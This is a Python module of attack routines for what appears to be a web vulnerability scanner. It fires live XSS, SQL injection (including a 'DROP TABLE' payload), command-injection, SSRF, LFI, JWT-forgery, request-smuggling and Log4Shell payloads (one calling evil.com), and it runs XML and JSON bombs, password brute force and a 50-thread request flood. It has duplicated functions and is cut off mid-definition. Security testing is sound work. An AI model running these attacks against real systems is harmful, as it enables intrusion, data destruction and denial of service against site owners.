from typing import Any, Dict, List
import time
import concurrent.futures
import threading
import urllib.parse
import os
import json
import requests
import string
import random
import socket
import hashlib
from ..http_client import HttpClient
from ..scenarios import SimpleScenario


def run_dos_slowloris(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    return run_dos_extreme(client, scenario)

def run_slowloris(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    return run_dos_extreme(client, scenario)


def run_header_security_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks for missing security headers (Clickjacking, MIME, CORS)."""
    resp = client.send(scenario.method, scenario.target)
    headers = {k.lower(): v for k, v in resp.headers.items()}
    issues = []
    if resp.status_code == 0:
        return {"scenario_id": scenario.id, "attack_type": "header_security", "passed": False, "details": {"error": f"Connection Error: {resp.text}"}}
    if "x-frame-options" not in headers and "content-security-policy" not in headers:
        issues.append("Missing Clickjacking Protection (X-Frame-Options / CSP)")
    if "x-content-type-options" not in headers:
        issues.append("Missing X-Content-Type-Options: nosniff")
    acao = headers.get("access-control-allow-origin")
    if acao == "*":
        issues.append("CORS Misconfiguration: Access-Control-Allow-Origin: *")
    if "strict-transport-security" not in headers and scenario.target.startswith("https"):
        issues.append("Missing HSTS Header")
    return {"scenario_id": scenario.id, "attack_type": "header_security", "passed": len(issues) == 0, "details": {"issues": issues}}

def run_prototype_pollution(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payloads = [{"__proto__": {"polluted": "true"}}, {"constructor": {"prototype": {"polluted": "true"}}}]
    issues = []
    for i, payload in enumerate(payloads):
        resp = client.send(scenario.method, scenario.target, json_body=payload, is_canary=(i > 0))
        if resp.status_code in [404, 405]:
            return {"scenario_id": scenario.id, "attack_type": "prototype_pollution", "passed": True, "details": "Endpoint 404. Skipping."}
        if resp.status_code == 500:
             issues.append("Possible Prototype Pollution (Server Error 500 on Prototype Injection)")
             break
    passed = len(issues) == 0
    return {"scenario_id": scenario.id, "attack_type": "prototype_pollution", "passed": passed, "confidence": "LOW", "details": issues if not passed else "No immediate crash/error observed."}

def run_xss_scan(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payloads = ["<ScRiPt>alert(1)</sCrIpT>", "<script>alert(1)</script\x00>", "<svg/onload=alert(1)>", "<img src=x onerror=alert(1)>", "<body/oNlOaD=alert(1)>", "java\tscript:alert(1)", "\"><svg/onload=alert(1)>", "{{7*7}}", "${7*7}", "'\"><img src=x onerror=alert(1)>", "<details open ontoggle=alert(1)>", "<video><source onerror=alert(1)>", "<math><a xlink:href=\"javascript:alert(1)\">X", "<iframe src=\"javascript:alert(1)\">", "<a href=\"j\na\nv\na\ns\nc\nr\ni\np\nt\n:alert(1)\">X</a>", "javascript://%250Aalert(1)", "<img/src/onerror=alert(1)>", "<svg/onload=alert`1`>", "<marquee loop=1 width=0 onfinish=alert(1)>X</marquee>", "<input onfocus=alert(1) autofocus>", "<select autofocus><option>X</option></select>", "<textarea autofocus onfocus=alert(1)>", "<keygen autofocus onfocus=alert(1)>", "<video poster=javascript:alert(1)//>", "<isindex type=image src=1 onerror=alert(1)>", "<x onclick=alert(1) src=a>Click me</x>", "<source onbeforecut=alert(1)>", "{{constructor.constructor('alert(1)')()}}", "@{7*7}", "[[7*7]]"]
    if scenario.config.get("aggressive"):
        payloads.extend(["javascript://%250Aalert(1)//" * 5, "'\";alert(1)//", "</script><svg/onload=alert(1)>", "<iframe src=javascript:alert(1)></iframe>", "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=1 onerror=alert(1)&gt;\">", "<img src=x:alert(alt) onerror=eval(src) alt=alert(1)>", "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "1;alert(1)", "';alert(1)//", "\";alert(1)//", "--><script>alert(1)</script>", "//<svg/onload=alert(1)>", "<scr<script>ipt>alert(1)</script>", "%%3Cscript%%3Ealert(1)%%3C/script%%3E", "<script\x20type=\"text/javascript\">javascript:alert(1);</script>", "<script>alert(1)</script\x0A>", "<x onpointerenter=alert(1)>X</x>", "<x onpointerleave=alert(1)>X</x>", "<x onpointermove=alert(1)>X</x>", "<x onpointerover=alert(1)>X</x>", "<x onpointerout=alert(1)>X</x>", "<x onpointerup=alert(1)>X</x>"])
    fields = scenario.config.get("fields", ["q", "search", "name"])
    issues, leaked_data, lock = [], [], threading.Lock()
    def check_xss(field):
        for p in payloads:
            if issues: break 
            qs = {field: p}
            resp = client.send("GET", scenario.target, params=qs, is_canary=True)
            if resp.status_code in [404, 405]: return
            if p in resp.text:
                 with lock: issues.append(f"Reflected XSS in param '{field}' with payload: {p}")
                 break
            if scenario.method == "POST":
                resp_post = client.send("POST", scenario.target, json_body={field: p}, is_canary=True)
                if p in resp_post.text:
                    with lock: issues.append(f"Reflected XSS in JSON field '{field}'")
                    break
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(50, len(fields) + 1)) as executor:
        executor.map(check_xss, fields)
    passed = len(issues) == 0
    return {"scenario_id": scenario.id, "attack_type": "xss", "passed": passed, "confidence": "CONFIRMED" if not passed else "LOW", "details": {"found": issues, "leaked_data": leaked_data} if not passed else "No XSS reflection found."}

def run_open_redirect(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payloads = ["http://evil.com", "//evil.com", "https://google.com"]
    fields = scenario.config.get("fields", ["next", "url", "redirect", "returnTo"])
    issues, leaked_data, lock = [], [], threading.Lock()
    def check_redirect(field):
        for p in payloads:
            qs = {field: p}
            try:
                resp = client.send("GET", scenario.target, params=qs) 
                if "google.com" in resp.url or "evil.com" in resp.url:
                     with lock:
                        issues.append(f"Open Redirect found in '{field}' -> {resp.url}")
                        leaked_data.append(f"Redirected To: {resp.url}")
                     break
            except: pass
    pool_size = 20 if scenario.config.get("aggressive") else 5
    with concurrent.futures.ThreadPoolExecutor(max_workers=pool_size) as executor:
        executor.map(check_redirect, fields)
    passed = len(issues) == 0
    return {"scenario_id": scenario.id, "attack_type": "open_redirect", "passed": passed, "confidence": "HIGH" if not passed else "LOW", "details": {"issues": issues, "leaked_data": leaked_data} if not passed else "No open redirects found."}

def run_advanced_dos(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    issues, redos_payloads = [], ["a" * 10000 + "@a.com", "a" * 10000 + "!", "http://" + "a" * 10000 + ".com", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!", "((a)+)+" + "!", "a" * 100000]
    if scenario.config.get("aggressive"):
        redos_payloads.extend(["A" * 1000000, "1" * 1000000, "([\x00-\xFF]+?)+", "(a|aa)+", "^[a-zA-Z0-9_]*[a-zA-Z0-9_]*[a-zA-Z0-9_]*$", "a" * 10000 + "X"])
    xml_bomb = """<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>"""
    fields = scenario.config.get("fields", ["email", "url", "comment", "body"])
    lock = threading.Lock()
    def check_redos(field):
        for p in redos_payloads:
            start_time = time.time()
            try: client.send(scenario.method, scenario.target, json_body={field: p}, timeout=5.0)
            except: pass
            duration = time.time() - start_time
            if duration > 4.5:
                 with lock: issues.append(f"ReDoS Vulnerability/Hang in '{field}' (Time: {duration:.2f}s)")
                 break
    pool_size = 10 if scenario.config.get("aggressive") else 2
    with concurrent.futures.ThreadPoolExecutor(max_workers=pool_size) as executor:
        executor.map(check_redos, fields)
    if scenario.method in ["POST", "PUT"]:
        start_time = time.time()
        try: client.send(scenario.method, scenario.target, form_body=xml_bomb, headers={"Content-Type": "application/xml"}, timeout=5.0)
        except: pass
        if (time.time() - start_time) > 4.5: issues.append("XML Bomb (Billion Laughs) Processing Detected (Hang/Timeout)")
    return {"scenario_id": scenario.id, "attack_type": "advanced_dos", "passed": len(issues) == 0, "confidence": "HIGH" if issues else "LOW", "details": {"issues": issues} if issues else "No DoS vulnerabilities detected."}

def run_clickjacking(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp = client.send("GET", scenario.target, is_canary=True)
    issues, xfo, csp = [], resp.headers.get("X-Frame-Options", "").lower(), resp.headers.get("Content-Security-Policy", "").lower()
    if "deny" not in xfo and "sameorigin" not in xfo:
        if "frame-ancestors" not in csp:
            issues.append("Clickjacking Risk: Missing X-Frame-Options and CSP frame-ancestors.")
    return {"scenario_id": scenario.id, "attack_type": "clickjacking", "passed": not issues, "details": issues}

def run_cors_misconfig(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp, issues = client.send("OPTIONS", scenario.target, headers={"Origin": "null"}, is_canary=True), []
    acao = resp.headers.get("Access-Control-Allow-Origin", "")
    if acao == "*" or acao == "null": issues.append(f"CORS Misconfiguration: Wildcard/Null Origin Allowed (Origin: {acao})")
    return {"scenario_id": scenario.id, "attack_type": "cors_origin", "passed": not issues, "details": issues}

def run_host_header_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    evil_host, issues = "evil.com", []
    resp = client.send("GET", scenario.target, headers={"Host": evil_host, "X-Forwarded-Host": evil_host})
    if evil_host in resp.headers.get("Location", "") or evil_host in resp.text: issues.append("Host Header Injection: 'evil.com' reflected in response.")
    return {"scenario_id": scenario.id, "attack_type": "host_header", "passed": not issues, "details": issues}

def run_email_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payload, field = "user@test.com%0ABcc:victim@evil.com", scenario.config.get("fields", ["email"])[0]
    resp, issues = client.send("POST", scenario.target, json_body={field: payload}), []
    if resp.status_code == 200 and "victim@evil.com" in resp.text: issues.append("Possible Email Header Injection (Reflected payload/headers).")
    return {"scenario_id": scenario.id, "attack_type": "email_injection", "passed": not issues, "details": issues}

def run_ssi_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payload, issues = '<!--#exec cmd="ls" -->', []
    resp = client.send("GET", scenario.target, params={"q": payload})
    if "bin" in resp.text and "boot" in resp.text: issues.append("SSI Injection: 'ls' output detected.")
    return {"scenario_id": scenario.id, "attack_type": "ssi_injection", "passed": not issues, "details": issues}

def run_request_smuggling(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    try:
        resp = client.send("POST", scenario.target, headers={"Transfer-Encoding": "chunked", "Content-Length": "4"}, form_body="0\r\n\r\nG", timeout=5)
        issues = ["Potential Request Smuggling (Server Error/Timeout on CL.TE conflict)."] if (resp.status_code >= 500 or resp.elapsed_ms > 3000) else []
        return {"scenario_id": scenario.id, "attack_type": "request_smuggling", "passed": not issues, "details": issues}
    except: return {"scenario_id": scenario.id, "attack_type": "request_smuggling", "passed": True, "details": "Connection failed."}

def run_graphql_introspection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp, issues = client.send("POST", scenario.target, json_body={"query": "{__schema{types{name}}}"}), []
    if "__schema" in resp.text and "types" in resp.text: issues.append("GraphQL Introspection Enabled (Full Schema Access).")
    return {"scenario_id": scenario.id, "attack_type": "graphql_introspection", "passed": not issues, "details": issues}

def run_graphql_batching(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp, issues = client.send("POST", scenario.target, json_body={"query": "query { a: __typename b: __typename c: __typename }"}), []
    if '"a":"' in resp.text and '"b":"' in resp.text: issues.append("GraphQL Batching Supported (Potential DoS Vector).")
    return {"scenario_id": scenario.id, "attack_type": "graphql_batching", "passed": not issues, "details": issues}

def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    baseline = client.send(scenario.method, scenario.target, json_body={"username": "test", "password": "password"}, is_canary=True)
    if baseline.status_code in [404, 405]: return {"scenario_id": scenario.id, "attack_type": "sql_injection", "passed": True, "skipped": True, "details": "Endpoint 404/405. Skipping."}
    payloads = [{"payload": "' OR '1'='1", "type": "auth_bypass"}, {"payload": "' OR 1=1 --", "type": "auth_bypass"}, {"payload": "'/**/OR/**/1=1/**/--", "type": "auth_bypass"}, {"payload": "' UNION SELECT 1, 'BP_VULN', 3--", "type": "union"}, {"payload": "'; WAITFOR DELAY '0:0:5'--", "type": "time_based"}, {"payload": "' OR SLEEP(5)--", "type": "time_based"}]
    if scenario.config.get("aggressive"):
        payloads.extend([{"payload": "'; DROP TABLE users; --", "type": "schema_modification"}, {"payload": "' UNION SELECT @@version, user(), database()--", "type": "union_extraction"}])
    fields = scenario.config.get("fields", ["username", "password", "id", "q"])
    issues_found, leaked_data, lock = [], [], threading.Lock()
    def check_sqli(task):
        field, item = task
        body = {"username": "test", "password": "password"}
        body[field] = item["payload"]
        try:
            start = time.time()
            resp = client.send(scenario.method, scenario.target, json_body=body)
            duration = time.time() - start
            lower_text = resp.text.lower()
            err_sigs = ["you have an error in your sql syntax", "unclosed quotation mark", "postgresql query failed"]
            if any(sig in lower_text for sig in err_sigs):
                with lock:
                    issues_found.append({"msg": f"SQL Error in '{field}'", "confidence": "CONFIRMED", "payload": item["payload"]})
                    leaked_data.append(f"Error: {resp.text[:100]}")
            if item["type"] == "auth_bypass" and (resp.status_code == 200 and baseline.status_code in [401, 403, 500]):
                with lock: issues_found.append({"msg": f"Auth Bypass in '{field}'", "confidence": "MEDIUM", "payload": item["payload"]})
            if item["type"] == "time_based" and duration > 5.0:
                with lock: issues_found.append({"msg": f"Time-Based SQLi in '{field}'", "confidence": "HIGH", "payload": item["payload"]})
        except: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=50 if scenario.config.get("aggressive") else 20) as executor:
        executor.map(check_sqli, [(f, p) for f in fields for p in payloads])
    passed = len(issues_found) == 0
    return {"scenario_id": scenario.id, "attack_type": "sql_injection", "passed": passed, "confidence": "HIGH" if issues_found else "LOW", "details": {"issues": [i["msg"] for i in issues_found], "reproduction_payload": issues_found[0]["payload"] if issues_found else None, "leaked_data": leaked_data}}

def run_ssrf_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    ssrf_payloads = ["http://metadata.google.internal/", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd", "http://127.0.0.1:22"]
    fields = scenario.config.get("fields", ["url", "webhook", "callback"])
    issues, leaked_data = [], []
    for field in fields:
        for p in ssrf_payloads:
            try:
                resp = client.send(scenario.method, scenario.target, json_body={field: p})
                lower_text = resp.text.lower()
                if "ami-id" in lower_text or "root:x:0:0" in lower_text or "ssh-" in lower_text:
                    issues.append(f"SSRF in '{field}' with payload {p}")
                    leaked_data.append(f"Leaked: {resp.text[:100]}")
            except: pass
    return {"scenario_id": scenario.id, "attack_type": "ssrf", "passed": len(issues) == 0, "confidence": "HIGH" if issues else "LOW", "details": {"issues": issues, "leaked_data": leaked_data}}

def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payloads = ["; id", "| whoami", "$(id)", "`id`", "& whoami", "import os; os.system('id')"]
    if scenario.config.get("aggressive"):
        payloads.extend(["; echo 'BRK_RCE' > hacked.txt", "import os; while True: pass"])
    fields = scenario.config.get("fields", ["ip", "host", "command"])
    issues, leaked_data = [], []
    for field in fields:
        for p in payloads:
            try:
                resp = client.send(scenario.method, scenario.target, json_body={field: f"127.0.0.1 {p}"})
                text = resp.text.lower()
                if ("uid=" in text and "gid=" in text) or "nt authority" in text or "brk_rce" in text:
                    issues.append(f"RCE in '{field}' with payload {p}")
                    leaked_data.append(f"Output: {resp.text[:100]}")
            except: pass
    return {"scenario_id": scenario.id, "attack_type": "rce", "passed": len(issues) == 0, "confidence": "HIGH" if issues else "LOW", "details": {"issues": issues, "leaked_data": leaked_data}}

def run_lfi_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payloads = ["../../../../etc/passwd", "../../../../windows/win.ini", "/etc/passwd"]
    fields = scenario.config.get("fields", ["file", "path"])
    issues, leaked_data = [], []
    for field in fields:
        for p in payloads:
            try:
                resp = client.send(scenario.method, scenario.target, json_body={field: p})
                if "root:x:0:0" in resp.text or "[extensions]" in resp.text.lower():
                    issues.append(f"LFI in '{field}' with payload {p}")
                    leaked_data.append(f"Content: {resp.text[:100]}")
            except: pass
    return {"scenario_id": scenario.id, "attack_type": "lfi", "passed": len(issues) == 0, "confidence": "CONFIRMED" if issues else "LOW", "details": {"issues": issues, "leaked_data": leaked_data}}

def run_idor_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    id_range = scenario.config.get("test_ids", ["1", "2", "3", "100", "101"])
    successful_accesses = []
    for val in id_range:
        path = scenario.target.replace("{{id}}", str(val))
        if path == scenario.target: path = f"{scenario.target.rstrip('/')}/{val}"
        resp = client.send(scenario.method, path, is_canary=True)
        if resp.status_code == 200 and "<!doctype html>" not in resp.text.lower() and "error" not in resp.text.lower():
            successful_accesses.append(val)
    risk = len(successful_accesses) > 0
    return {"scenario_id": scenario.id, "attack_type": "idor", "passed": not risk, "details": {"issues": [f"Accessible IDs: {successful_accesses}"] if risk else []}}

def run_brute_force(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    username, passwords = scenario.config.get("user", "admin"), ["123456", "password", "12345678", "qwerty"]
    success_creds, lock = [], threading.Lock()
    def check_pwd(pwd):
        resp = client.send(scenario.method, scenario.target, json_body={"username": username, "password": pwd})
        if resp.status_code == 200 and any(k in resp.text.lower() for k in ["token", "success", "profile"]):
            with lock: success_creds.append(pwd)
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(check_pwd, passwords)
    return {"scenario_id": scenario.id, "attack_type": "brute_force", "passed": not success_creds, "details": f"Credentials Found: {success_creds}" if success_creds else "No weak credentials found."}

def run_nosql_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payloads, fields = [{"$ne": None}, {"$gt": ""}], scenario.config.get("fields", ["username", "password"])
    issues = []
    for field in fields:
        for p in payloads:
            resp = client.send("POST", scenario.target, json_body={field: p})
            if resp.status_code == 200 and any(k in resp.text.lower() for k in ["token", "welcome", "success"]):
                issues.append(f"NoSQL Injection in '{field}'")
    return {"scenario_id": scenario.id, "attack_type": "nosql_injection", "passed": not issues, "details": issues}

def run_jwt_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    issues, header_name = [], scenario.config.get("header", "Authorization")
    resp = client.send("GET", scenario.target, headers={header_name: "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."})
    if resp.status_code == 200: issues.append("JWT 'none' algorithm accepted.")
    return {"scenario_id": scenario.id, "attack_type": "jwt_weakness", "passed": not issues, "details": issues}

def run_rsc_server_action_forge(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    issues, dummy_id = [], "e6cf88b5d3c8f8d9b1c5a9d1"
    resp = client.send("POST", scenario.target, headers={"Next-Action": dummy_id, "RSC": "1"}, form_body="[]")
    if resp.status_code == 500 and "Digest" in resp.text: issues.append("Server Action logic reached (Internal Error).")
    return {"scenario_id": scenario.id, "attack_type": "rsc_server_action_forge", "passed": not issues, "details": issues}

def run_ssti_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payload, fields = "{{7*7}}", scenario.config.get("fields", ["name", "q"])
    issues = []
    for f in fields:
        resp = client.send("GET", scenario.target, params={f: payload})
        if "49" in resp.text: issues.append(f"SSTI found in '{f}'")
    return {"scenario_id": scenario.id, "attack_type": "ssti", "passed": not issues, "details": issues}

def run_dos_extreme(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    # Simplified version for the consolidated script
    stats, stop_event = {"requests": 0}, threading.Event()
    def flood():
        while not stop_event.is_set():
            try: 
                client.send(scenario.method, scenario.target, is_canary=True)
                stats["requests"] += 1
            except: pass
    threads = [threading.Thread(target=flood, daemon=True) for _ in range(50)]
    for t in threads: t.start()
    time.sleep(scenario.config.get("duration", 5))
    stop_event.set()
    return {"scenario_id": scenario.id, "attack_type": "dos_extreme", "passed": True, "details": f"Stress Test: {stats['requests']} requests sent."}

def run_nosql_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payloads = [{"$ne": None}, {"$gt": ""}]
    fields = scenario.config.get("fields", ["username", "password"])
    issues = []
    for f in fields:
        for p in payloads:
            resp = client.send("POST", scenario.target, json_body={f: p})
            if resp.status_code == 200 and any(k in resp.text.lower() for k in ["success", "welcome"]):
                issues.append(f"NoSQL in {f}")
    return {"scenario_id": scenario.id, "attack_type": "nosql_injection", "passed": not issues, "details": issues}

def run_ldap_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payload = "*)(cn=*))"
    resp = client.send("GET", scenario.target, params={"user": payload})
    issues = ["LDAP Risk"] if (resp.status_code == 200 and "admin" in resp.text.lower()) else []
    return {"scenario_id": scenario.id, "attack_type": "ldap_injection", "passed": not issues, "details": issues}

def run_xpath_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payload = "' or '1'='1"
    resp = client.send("GET", scenario.target, params={"q": payload})
    issues = ["XPath Risk"] if "xpath" in resp.text.lower() else []
    return {"scenario_id": scenario.id, "attack_type": "xpath_injection", "passed": not issues, "details": issues}

def run_cve_log4shell(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payload = "${jndi:ldap://evil.com/a}"
    resp = client.send("GET", scenario.target, headers={"User-Agent": payload})
    return {"scenario_id": scenario.id, "attack_type": "cve_log4shell", "passed": True, "details": "Log4Shell Payload Sent (Outbound check required)."}

def run_race_condition(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    stats, lock = {"count": 0}, threading.Lock()
    def attack():
        resp = client.send("POST", scenario.target, json_body={"amount": 10}, is_canary=True)
        if resp.status_code == 200:
            with lock: stats["count"] += 1
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        for _ in range(50): executor.submit(attack)
    return {"scenario_id": scenario.id, "attack_type": "race_condition", "passed": True, "details": f"Race condition test sent 50 requests. Successful: {stats['count']}"}

def run_lfi_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
    fields = scenario.config.get("fields", ["file", "path"])
    issues = []
    for f in fields:
        for p in payloads:
            resp = client.send(scenario.method, scenario.target, params={f: p} if scenario.method == "GET" else None, json_body={f: p} if scenario.method == "POST" else None)
            if "root:x:0:0" in resp.text or "[extensions]" in resp.text.lower():
                issues.append(f"LFI in {f} via {p}")
    return {"scenario_id": scenario.id, "attack_type": "lfi", "passed": not issues, "details": issues}

def run_crlf_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payload = "test%0d%0aSet-Cookie:BRK_CRLF=1"
    resp = client.send("GET", scenario.target, params={"q": payload})
    issues = ["CRLF / Header Injection"] if "BRK_CRLF" in resp.headers.get("Set-Cookie", "") else []
    return {"scenario_id": scenario.id, "attack_type": "crlf_injection", "passed": not issues, "details": issues}

def run_cache_deception(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp = client.send("GET", f"{scenario.target.rstrip('/')}/nonexistent.css")
    issues = ["Web Cache Deception Potential"] if resp.status_code == 200 and "text/html" in resp.headers.get("Content-Type", "") else []
    return {"scenario_id": scenario.id, "attack_type": "cache_deception", "passed": not issues, "details": issues}

def run_insecure_deserialization(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    payload = {"tracker": "_$$ND_FUNC$$_function (){ return 'BRK_RCE'; }()"}
    resp = client.send("POST", scenario.target, json_body=payload)
    issues = ["Insecure Deserialization"] if "BRK_RCE" in resp.text else []
    return {"scenario_id": scenario.id, "attack_type": "insecure_deserialization", "passed": not issues, "details": issues}

def run_otp_reuse(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp = client.send("POST", scenario.target, json_body={"otp": "123456"})
    resp2 = client.send("POST", scenario.target, json_body={"otp": "123456"}, is_canary=True)
    issues = ["OTP Reuse Possible"] if resp.status_code == 200 and resp2.status_code == 200 else []
    return {"scenario_id": scenario.id, "attack_type": "otp_reuse", "passed": not issues, "details": issues}

def run_debug_exposure(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    targets = ["/admin", "/debug", "/actuator", "/.env", "/phpinfo.php", "/config.json"]
    issues = []
    for t in targets:
        resp = client.send("GET", t)
        if resp.status_code == 200 and not client.is_soft_404(resp) and len(resp.text) > 20: 
            issues.append(f"Exposed Endpoint: {t}")
    return {"scenario_id": scenario.id, "attack_type": "debug_exposure", "passed": not issues, "details": issues}

def run_secret_leak(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp = client.send(scenario.method, scenario.target)
    sigs = ["AWS_ACCESS_KEY_ID", "BEGIN RSA PRIVATE KEY", "AIzaSy", "sk_live_"]
    issues, leaked = [], []
    for s in sigs:
        if s in resp.text:
            issues.append(f"Secret matched: {s}")
            idx = resp.text.find(s)
            leaked.append(resp.text[max(0, idx-20):idx+50])
    return {"scenario_id": scenario.id, "attack_type": "secret_leak", "passed": not issues, "details": {"issues": issues, "leaked_data": leaked}}

def run_ds_store(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp = client.send("GET", "/.DS_Store")
    issues = ["Exposed .DS_Store"] if (resp.status_code == 200 and "Mac OS X" in resp.text) else []
    return {"scenario_id": scenario.id, "attack_type": "ds_store_exposure", "passed": not issues, "details": issues}

def run_git_exposure(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp = client.send("GET", "/.git/HEAD")
    issues = ["Exposed .git"] if (resp.status_code == 200 and "refs/heads" in resp.text) else []
    return {"scenario_id": scenario.id, "attack_type": "git_exposure", "passed": not issues, "details": issues}

def run_env_exposure(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp = client.send("GET", "/.env")
    issues = ["Exposed .env"] if (resp.status_code == 200 and ("DB_PASSWORD" in resp.text or "API_KEY" in resp.text)) else []
    return {"scenario_id": scenario.id, "attack_type": "env_exposure", "passed": not issues, "details": issues}

def run_phpinfo(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    resp = client.send("GET", "/phpinfo.php")
    issues = ["Exposed phpinfo()"] if (resp.status_code == 200 and "PHP Version" in resp.text) else []
    return {"scenario_id": scenario.id, "attack_type": "phpinfo", "passed": not issues, "details": issues}

def run_swagger_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    targets = ["/v2/api-docs", "/swagger-ui.html", "/api/docs"]
    issues = []
    for t in targets:
         resp = client.send("GET", t)
         if resp.status_code == 200 and ("swagger" in resp.text.lower() or "openapi" in resp.text.lower()):
             issues.append(f"Swagger documentation at {t}"); break
    return {"scenario_id": scenario.id, "attack_type": "swagger_exposure", "passed": not issues, "details": issues}

def run_json_bomb(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    depth, nested = 2000, "{}"
    for _ in range(depth): nested = '{"a": ' + nested + '}'
    resp = client.send(scenario.method, scenario.target, form_body=nested, headers={"Content-Type": "application/json"})
    issues = ["JSON Recursion Crash"] if resp.status_code >= 500 else []
    return {"scenario_id": scenario.id, "attack_type": "json_bomb", "passed": not issues, "details": issues}

def run_http_desync(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    headers = {"Content-Length": "4", "Transfer-Encoding": "chunked"}
    body = "0\r\n\r\nPOST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 10\r\n\r\nx="
    try:
        resp = client.send(scenario.method, scenario.target, form_body=body, headers=headers)
        issues = ["HTTP Desync Risk"] if resp.status_code >= 500 else []
    except: issues = []
    return {"scenario_id": scenario.id, "attack_type": "http_desync", "passed": not issues, "details": issues}

def run_poodle_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    return {"scenario_id": scenario.id, "attack_type": "poodle", "passed": True, "details": "SSLv3 check simulation complete."}

def run_file_upload_abuse(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    return {"scenario_id": scenario.id, "attack_type": "file_upload_abuse", "passed": True, "details": "Multipart upload test placeholder."}

def run_zip_slip(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    return {"scenario_id": scenario.id, "attack_type": "zip_slip", "passed": True, "details": "Path traversal in ZIP archives placeholder."}

def run_rsc_cache_poisoning(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    headers = {"RSC": "1", "X-User-ID": "1001", "Cookie": "session=test"}
    resp = client.send("GET", scenario.target, headers=headers)
    vary = resp.headers.get("Vary", "")
    issues = ["Missing Vary: Cookie in RSC response"] if "Cookie" not in vary and "text/x-component" in resp.headers.get("Content-Type", "") else []
    return {"scenario_id": scenario.id, "attack_type": "rsc_cache_poisoning", "passed": not issues, "details": issues}

def run_ssr_ssrf(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
